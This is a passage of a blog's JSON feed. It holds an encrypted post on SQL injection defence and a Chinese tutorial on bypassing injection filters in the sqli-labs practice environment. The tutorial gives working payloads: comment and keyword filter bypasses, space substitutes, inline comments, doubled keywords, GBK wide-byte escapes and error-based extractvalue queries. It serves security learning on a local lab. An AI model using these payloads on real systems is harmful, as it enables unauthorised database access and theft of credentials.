{
    "version": "https://jsonfeed.org/version/1",
    "title": "My Violet Eva Garden • All posts by \"sql注入探究\" category",
    "description": "",
    "home_page_url": "https://kiyomijin.github.io",
    "items": [
        {
            "id": "https://kiyomijin.github.io/2022/10/03/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/",
            "url": "https://kiyomijin.github.io/2022/10/03/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/",
            "title": "SQL注入防御",
            "date_published": "2022-10-02T16:01:22.000Z",
            "content_html": "<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"d8738492a3eace68e96354c22949b135ae9c2ba1fb925ed5958626ce525a8ec0\">881d2a9d793d5558f4c5d7fc62042411cf78789d816c07caf10e349ab53763fc5d13120843a9e21c92b2b88c68f041cce14a1640542f96b1108b53d559d0a58529fc681accd2f9c73a50648cdc0d43c51eb6cea7795993f95cac630ae2147fc035510f34e55c4077d034ad7912944b09fd6952d24abc6b21b93aa1a7a28759cac09f58bade1d4107c942c466d45b3e87ac6636ff97d567ea1420c8e65ff532ef4b5644362a165b27041829260e50a95d66ab05f71091b3f5045fd9dd8478a54ecd13548587cb02d751a99678cdb86f3a11acd48d136cc836a3cc5cd5fee9b9eb2fa7e652a9a051ffa9a9e7b2faef930359d6e16a60e93926fb723087f2d14a85375781a65eff272dd196b80797a8ff9a797675fa4b344b22591c89fc139b5a08e43370f78c72e4c90b2b3925931644511c0ad528e6f879ee94c71fe65c1a75b8aa69d37b41f6b24ad6b813de28c70ce506c3872d1fb05ba5f7c465910826ff6f6896a652d15203b97a894b90a3ec3f0141aad4f01d45f209648de9db4e7bce43d282e726140df63cb0ca03b143a0cea0a4cf32deebc608b49397c9d142aa86e88378e09500fa1bd107d2649640e9311eca4d8c59e5e26459378f0037a927da3864e08c347d619a6401ab7a4e0c106cd345c72c91b7b1b22f96077192556e30ad854fe7f1dad83efbd7bb6f27c467c18058fa329d6a76f0072745dcc86df72d956eb00a563334b18267f405d6d34dce99b8f998c4bed90161d98e9bee72cd001bc26d9926cfac99e96b9b2faa7c6db7810e46387848565e8037560981acdccd0c1d5fd3324a0d91f3450fe13c882ec85f97a1d07af6f051195efcab7e974778d84a4525ad602b4fdacb980409cf3f92f633bd2911d17c8d1af32325c5d797cf06e02b7c89fbbf298760b36e803d86139e72e1584e15697d50dc7fa132187f736e554242236b59eea2f67208eac4799a167b210a059ec2a5ec0cd48341f9a67fd5ff5ce45082d07fe309aaa4c30aabe4c6ce8ba3e6bf8ba0f239a8706a35af1ae96b87cefd28cb9bd959f232c2a94834ea98dc87d9a8117f24ce959f9cd03f074766596fc7101771d1a4b71795584ff95975432369ccd437ac85757350505c7ab7d21f21726d1fa4a79dbe3bff97c09ee1b9c53d1b8e1e2b095d28aec63aa54d041f635440e2963fbadbd824487c5c5ee9d69120a08b2a277af3832a9ca2ebd078d9b7957b250d038ba5804680c267353359f10d9055880d64c751aeaf64336c053d48b0116445377f1ccdcf3b247c09132146651338724663667b850e9e444c0d78adb311daafea4719346654c37998ff68dafd2c887754cfabeb367d38aa6ed3940b9e07d7e44634592d2c7329cddfc9eb906be5d2d139c29951b9ed2806d132298cd2eb7e5b7095bc589fbb61f85831b83f41d4d9f4005944f8c5f14cac81327f175f94326a90bf6de039d7357f0b75fddce3d0cb5ac48e30f89204f7fcb48527cd1035e6110dd9aa7de164aa965ff1ec26383f4f721e1d63131996a60a4df71297d91499da15d11415fc49e74a7382e29f46671d1c6c26f9bc4007d26ac28cfb46e442d26281ed1787167aa40556dcd0e894e7b1db9c8dbae6ce0b5d698842f73492d1fc05d2c0c1c66a43c41369624abd720fea7aedb9d7e9a9b1d9ed0f53c622a277469e1e3975c840f056b54a8e289cd245f79abba07ccfb21e2dfb0c59dc60e75efb5a8826815d464d774b967fd62aea6bfee4a9083c3165ebe3f5f828dfe0e3e5e7f20b1e02c5e1bd98529ede8b2265f5eac4e534b27371782d9cb61bbf348b2c71a70ed4d68f645dd97069191e1520bd173662510920f6cc4e30acbabf1baef636dc0b138392a463e5b5de608ddc1b8168a3120a6fc347c49e5ff39a0a17f698cf1c61221f02f947ec283d1520a3e0af894a31b661fc3ec2a2ebf57cad1bb38c67c16f86d48a8c7848cc2bf3376856e50b571bdfc4735eae8c00a5b3a88ad81bf11369caa26fe62ea23b6a4a0c948cfd5a9d0bd799279bac37f6baba94d7ed84a2fce68dea203cb7f9cb4fe7cf13927a0de0aec2168a01757704a3227c7d13e17becc121fc70d9d9d81de7a8ab45a70deb914edd67cf35b694efd4cc449ba336d767536c51aaa745d1de54cd8c699ace0052ebbf24232e6af4edb1b58dcd0d0878964e4ca90acccd8a1c14c1a3e50a09d8aeba6cc3a74abbfa78b05a0cdf3d45bc08e0e01b4672a19aa76697c1106e9e9a86025865e539fd1a2205b929f94d9900b90f661b2fcd3efbec6d47f44bf58ce2692def75493e8d8872f4d8645cd9ca9754734c0340c3a042ec6fe317c23ba3fd49e9a5f591d7f71c688af434ab47cb6db209ddbb5a72d26e699bf84599ac433e337096c36697f3ee3060516d86726aa47d69e068ac53fcaa1da48fc8aad0fa51f0dc160f48eb4cc22f06be16ed679e5a43f3655ae85ec9f4da3bbb1b9808e5bca16e0d226a0b57c0273e200b05166db2e47566f35a118bcaf68a378574c63c54cbc8ce5f26b671148d89af47bf9894f738bfe0406b299a5d523bc94ada7ccd7f56d20b819c6cd2b818f28d2e688a649d1b5e64dfc99083a9f0fda5d75c09bd8951da404e7dfc267e417b4dc826ee3b44b962d82ef3ed6ec4263afb02cb95bc91de52c33fef88ae81c644dfffaf4da7aaae40f4aa8223664bcce2b8cbd7059cb3a5f9086e9a9137bf7e56aaa03d47f8c1b3e103b7af111d0923bfd8b799c524ce624a69ed060404052623271c5bb9df5578832a6a1f17edfd78ae70007642770b9446e516f27aa2475437678742e99fe4151ba666001c90cb3f2e5ff3ea885b9c1bd1588eea926842705736cde1c529a86c3a4aaa6fd5c00adc868e7e990ab65c72ac3728eb7b5d64471b87cfc6cd372366070dcceb9fb446156e8b5786eaae529c2e5e61e962563562ad7106167aeb29bdb642bd8f70fc30cdae4e734f7e4bbc5c3470bcb815cd98fdd858cc4393799958a6e31a8bd7e54ad661c36fde832106fe2fc4a705f617c6935f8b143498788d4ea1e3d1bee8a8c35017b549f4ae9f39510c459e50bf5d5442849c694e4679288fc4fe8cd22e2d2e5818418bdfe0f5fdafd7b56c06f3fea0ea3663a4332c25c272f64ef3e77cad0b4606884fd5a54acba37eaa10bce737986f85cf69ca5ef16aae598525507320c5eb5b0c200b814c831a72c67caca7805b8028826c9dafa28736d2ac649b338e3c674645f061c7841480bdb9eff0bdf6d51203958d1b01a74b3a878dd2eb07a0d5d972c63f72712086eca0749c8904853ff10873870ea6b4e9b3c8500e9ca5eef11823bdd74b41e51b713f0b7fcbbcc5a25a81290ee842ecddaab94f041b831a9edd56928b4d3370ae60ca9f6c3f7609477700c6fd0696df0bd108fdd8a7133236e63bd3b3a54dd6f7237c332c65a69d531cf4f1454b8daafc09807658d000f70c83f6a5fe998acf89ae1d967696b77752d511f7de6666e141235e01bfddcbef0121a3587d978d34fb9151223fbdbb378537b6a0cf669a3c4ad8fee3856a0995524ce098c7dfaa5484069757a9c74a5df497794232d3ecc33b728fce8cf19ec29cdc7bebb9530c0c8a6b36e3b28ef2a97ac9efb8802869eb7d4a6257d60ded569c87b7ca14052d3967b82fa07a4a28d24e103af3ab88b08a6b59dd39651a7f8ce6efe793482b961f8be1285431c2e62d3c253815076ba73fcdd2bcef2f4825b1bf0167c56dd9e8853c1f423ff66bd2e330520f0d20f181b040b31b53904747456463c260aa99dc76ed11dfe69ac1b0a110f9f367a24c43507d81611a96e7cb59c81c2870740ba5bf5dc4d06c18dbb8b10ccb044f8e6b0e7906f8673fc5402138ed8d422db5596307b6323e15f310e61f80e46d9a5a8c9f8913af3e37557681d089e960c4a9d67aa36d816d2224464c12d9ed02f37d005f00102684691817c13ef324a504</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-wave\">\n      <input class=\"hbe hbe-input-field hbe-input-field-wave\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-wave\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-wave\">Hey, password is required here.</span>\n      </label>\n      <svg class=\"hbe hbe-graphic hbe-graphic-wave\" width=\"300%\" height=\"100%\" viewBox=\"0 0 1200 60\" preserveAspectRatio=\"none\">\n        <path d=\"M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0\"></path>\n      </svg>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%8A%80%E5%B7%A7/",
            "url": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%8A%80%E5%B7%A7/",
            "title": "绕过注入防御技巧",
            "date_published": "2022-10-02T15:16:31.000Z",
            "content_html": "<h1 id=\"绕过各种注入防御\"><a href=\"#绕过各种注入防御\" class=\"headerlink\" title=\"绕过各种注入防御\"></a>绕过各种注入防御</h1><p>下面介绍几个绕过注入防御的知识：</p>\n<h2 id=\"绕过注释符过滤\"><a href=\"#绕过注释符过滤\" class=\"headerlink\" title=\"绕过注释符过滤\"></a>绕过注释符过滤</h2><p>常见注释符有：<code>#</code>、<code>%23</code>、<code>--+</code></p>\n<p>Less-23为例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002134327907.png\" alt=\"image-20221002134327907\"></p>\n<p>做以下尝试：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">2.</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; %23</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">3.</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; %23 a</span><br><span class=\"line\">报错，syntax to use near &#x27;a&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">4.</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;&quot; %23 a</span><br><span class=\"line\">syntax to use near &#x27;&quot; a&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>根据第三、第四次的结果来看</p>\n<p><code>1&#39; %23 a</code>  —-&gt; <code>a&#39; LIMIT 0,1</code></p>\n<p><code>1&#39;&quot; %23 a</code> —-&gt; <code>&quot; a&#39; LIMIT 0,1</code></p>\n<p>共同的特性是<strong>输入的字母a保留，%23被过滤</strong></p>\n<p>那<code>#</code>和<code>--+</code>呢？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;&quot; # a</span><br><span class=\"line\">报错，syntax to use near &#x27;&quot; &#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;&quot; --+ a</span><br><span class=\"line\">报错，syntax to use near &#x27;&quot; a&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>因此，有理由怀疑——<strong>注释符被后台彻底过滤</strong>。</p>\n<p>我们来根据报错语句猜想一下后台语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from xxxx where id = &#x27;1&#x27; limit 0,1</span><br></pre></td></tr></table></figure>\n<h3 id=\"绕过方式一\"><a href=\"#绕过方式一\" class=\"headerlink\" title=\"绕过方式一\"></a>绕过方式一</h3><p>我们可以尝试加一个<code>单引号</code>+<code>等号</code>+<code>单引号</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from xxxx where id = &#x27;1 &#x27;=&#x27; &#x27; limit 0,1</span><br></pre></td></tr></table></figure>\n<p><code>&#39;=&#39;</code>即为我们的注入语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;=&#x27;</span><br><span class=\"line\">Your Login name:Angelina</span><br><span class=\"line\">Your Password:I-kill-you</span><br></pre></td></tr></table></figure>\n<p>成功查询，不报错。但是使用<code>&#39;=&#39;</code>的话，我们没地方可插入一些想要的查询语句</p>\n<p>我们需要换一个思路</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; or 1 or &#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>那么可以使用<code>布尔注入</code> + <code>报错注入</code>结合，替换两个<code>or</code>中间的那个<code>1</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; or (select extractvalue(1,concat(0x7e,version(),0x7e))) or &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002140115121.png\" alt=\"image-20221002140115121\"></p>\n<p>接下来就可以愉快地爆出数据库名、表、列、值等信息。</p>\n<p>以爆出列名为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; or (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))) or &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002140341257.png\" alt=\"image-20221002140341257\"></p>\n<h3 id=\"绕过方式二\"><a href=\"#绕过方式二\" class=\"headerlink\" title=\"绕过方式二\"></a>绕过方式二</h3><p>其实，我们也可以通过闭合前后的单引号，中间使用union来做操作</p>\n<p><code>注意</code>：后面单引号引领着一个列，所以union select的包含的列需要把后面的单引号内容考虑进来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#两个列</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; union select 1, &#x27;</span><br><span class=\"line\">报错，The used SELECT statements have a different number of columns</span><br><span class=\"line\"></span><br><span class=\"line\">#三个列</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; union select 1,2,&#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<h2 id=\"绕过and-or强过滤\"><a href=\"#绕过and-or强过滤\" class=\"headerlink\" title=\"绕过and/or强过滤\"></a>绕过and/or强过滤</h2><p>将and/or 及其大小写，混合大小写（Or、oR等）均替换成空</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27;</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27; %23</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27; order by 2 %23</span><br><span class=\"line\">报错，syntax to use near &#x27;der by 2 #&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27; aa order by 2 %23</span><br><span class=\"line\">报错，syntax to use near &#x27;aa der by 2 #&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以发现or被强制过滤，即任何出现or的地方被强制替换成空</p>\n<h3 id=\"绕过方式\"><a href=\"#绕过方式\" class=\"headerlink\" title=\"绕过方式\"></a>绕过方式</h3><p>使用<code>||</code>、<code>oorr</code>来替代or，再使用布尔替换+报错注入构造查询：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=-1&#x27; || (select extractvalue(1,concat(0x7e,version(),0x7e))) %23</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27; oorr (select extractvalue(1,concat(0x7e,version(),0x7e))) %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002142717645.png\" alt=\"image-20221002142717645\"></p>\n<h2 id=\"绕过空格字符\"><a href=\"#绕过空格字符\" class=\"headerlink\" title=\"绕过空格字符\"></a>绕过空格字符</h2><p>Less-26为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27;</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; %23</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; or 1 or &#x27;</span><br><span class=\"line\">错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; || 1 || &#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>由此，可以构造：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; || (select extractvalue(1,concat(0x7e,version(),0x7e))) || &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002143828165.png\" alt=\"image-20221002143828165\"></p>\n<p>空格被过滤</p>\n<h3 id=\"绕过方式-1\"><a href=\"#绕过方式-1\" class=\"headerlink\" title=\"绕过方式\"></a>绕过方式</h3><p>常见的空格替换方式有：</p>\n<ul>\n<li><code>%09</code> TAB键(水平)</li>\n<li><code>%0a</code> 新建一行</li>\n<li><code>%0c</code> 新的一页</li>\n<li><code>%0d</code> return 功能</li>\n<li><code>%0b</code> TAB键(垂直)</li>\n<li><code>%a0</code> 空格</li>\n<li><code>/**/</code>也是一种替代空格方式</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; || (select%a0extractvalue(1,concat(0x7e,version(),0x7e))) || &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002144131652.png\" alt=\"image-20221002144131652\"></p>\n<h2 id=\"绕过一些对于select、union的限制\"><a href=\"#绕过一些对于select、union的限制\" class=\"headerlink\" title=\"绕过一些对于select、union的限制\"></a>绕过一些对于select、union的限制</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;</span><br><span class=\"line\">syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; %23</span><br><span class=\"line\">syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; or 1 or &#x27; %23</span><br><span class=\"line\">syntax to use near &#x27;or1or&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>基于以上尝试，可以看出空格被过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0or%a01%a0or%a0&#x27; %23</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>那么可以有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0order%a0by%a02&#x27; %23</span><br><span class=\"line\">报错，尝试用union select</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; union select 1,&#x27;</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0union%a0select%a01,&#x27;</span><br></pre></td></tr></table></figure>\n<p>可以看出，union和select被过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0&quot;union%a0select%a01,&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002150152965.png\" alt=\"image-20221002150152965\"></p>\n<h3 id=\"绕过方式一-1\"><a href=\"#绕过方式一-1\" class=\"headerlink\" title=\"绕过方式一\"></a>绕过方式一</h3><p>大小写随机替换（可能需要多尝试几次）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0Union%a0seLEct%a01,2,&#x27;</span><br><span class=\"line\">报错，syntax to use near &#x27;seLEct�1,2,&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0UNion%a0seLEct%a01,2,&#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; UNion sEleCT 1,2,&#x27;</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0UNion%a0sEleCT%a01,2,&#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002150723525.png\" alt=\"image-20221002150723525\"></p>\n<h3 id=\"绕过方式二-1\"><a href=\"#绕过方式二-1\" class=\"headerlink\" title=\"绕过方式二\"></a>绕过方式二</h3><p>使用内联注释绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; /*!union*/ /*!select*/ 1,2,&#x27;</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0/*!union*/%a0/*!select*/%a01,2,&#x27;</span><br></pre></td></tr></table></figure>\n<h3 id=\"绕过方式三\"><a href=\"#绕过方式三\" class=\"headerlink\" title=\"绕过方式三\"></a>绕过方式三</h3><p>使用双写、三写绕过（和绕过方式一一样，这个也需要多次尝试）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#在union任意位置中插入union</span><br><span class=\"line\">union---&gt;un union ion (双写)</span><br><span class=\"line\"></span><br><span class=\"line\">#在select任意位置中插入select</span><br><span class=\"line\">select ---&gt;se select lect(双写) ----&gt; sese select lectlect(三写)</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0ununionion%a0seseselectlectlect%a01,2,&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002170323197.png\" alt=\"image-20221002170323197\"></p>\n<h2 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h2><p>MySQL中，当数据库编码是GBK的时候，编码可以表示中文，两个字符代表一个汉字。</p>\n<p>编码范围是：8140-FEFE</p>\n<p>其中，GB2312的编码范围是：B0A1-F7FE</p>\n<p>Less-32为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1&#x27;</span><br><span class=\"line\">Hint: The Query String you input is escaped as : 1\\&#x27;</span><br><span class=\"line\">The Query String you input in Hex becomes : 315c27</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1&#x27;&quot;</span><br><span class=\"line\">Hint: The Query String you input is escaped as : 1\\&#x27;\\&quot;</span><br><span class=\"line\">The Query String you input in Hex becomes : 315c275c22</span><br></pre></td></tr></table></figure>\n<p>可以发现，我们的单引号在服务器后台被<code>\\号</code>转义了。</p>\n<h3 id=\"绕过方式-2\"><a href=\"#绕过方式-2\" class=\"headerlink\" title=\"绕过方式\"></a>绕过方式</h3><p>观察反斜杠的hex值发现是5c，接下来我们根据GBK编码来做单引号逃逸。</p>\n<p><code>815C</code>在GBK编码范围<code>8140-FEFE</code>中，因此我们在单引号前加一个%81，令其与后台的反斜杠组成双字节被解析，从而释放出我们的单引号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1%81&#x27; %23</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\">Hint: The Query String you input is escaped as : 1�\\&#x27; #</span><br></pre></td></tr></table></figure>\n<p>同理，在GBK2312里行得通吗？答案是肯定的</p>\n<p><code>B15C</code>在GB2312的编码范围<code>B0A1-F7FE</code>中，那么：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1%B1&#x27; %23</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\">Hint: The Query String you input is escaped as : 1�\\&#x27; #</span><br></pre></td></tr></table></figure>\n<p>因此就可以：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1%B1&#x27; order by 3%23</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1%B1&#x27; order by 4%23-----报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=-1%B1&#x27; union select 1,2,version()%23</span><br><span class=\"line\">Your Login name:2</span><br><span class=\"line\">Your Password:5.1.73-community</span><br></pre></td></tr></table></figure>\n<h2 id=\"过滤函数绕过\"><a href=\"#过滤函数绕过\" class=\"headerlink\" title=\"过滤函数绕过\"></a>过滤函数绕过</h2><p>以SQLC-sql9为例</p>\n<p>输入admin、admin结果报错</p>\n<p><img src=\"image-20221002173314221.png\" alt=\"image-20221002173314221\"></p>\n<p>直接上BurpSuit，抓包送入Repeater</p>\n<p><img src=\"image-20221002173445571.png\" alt=\"image-20221002173445571\"></p>\n<p>输入单引号，报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27;&amp;passwd=admin</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002173656791.png\" alt=\"image-20221002173656791\"></p>\n<p>我们直接送入Intruder进行特殊字符爆破，看看都过滤了哪些字符</p>\n<p><img src=\"image-20221002174151275.png\" alt=\"image-20221002174151275\"></p>\n<p>将特殊字符load进来</p>\n<p><img src=\"image-20221002174237643.png\" alt=\"image-20221002174237643\"></p>\n<p>可以看到过滤了空格，逗号等字符【由于环境不一样可能每个人的结果不同，因此不贴图，按照没有空格和逗号展开绕过】</p>\n<p>既然没有空格，我们可以使用<code>小括号</code>或者<code>%a0</code>代替，这里选择<code>小括号</code>。</p>\n<p>既然没有逗号，那么很多函数我们就用不了了，比如<code>substr</code>、<code>extractvalue</code>等等。</p>\n<p>但是，substr还有个特性就是substr(str from n) 表示<strong>从第n位到结尾截取字符</strong></p>\n<p>OK，空格和逗号的问题都解决了。<strong>剩下就是搞定注入点</strong>！！！！</p>\n<p><img src=\"image-20221002230320006.png\" 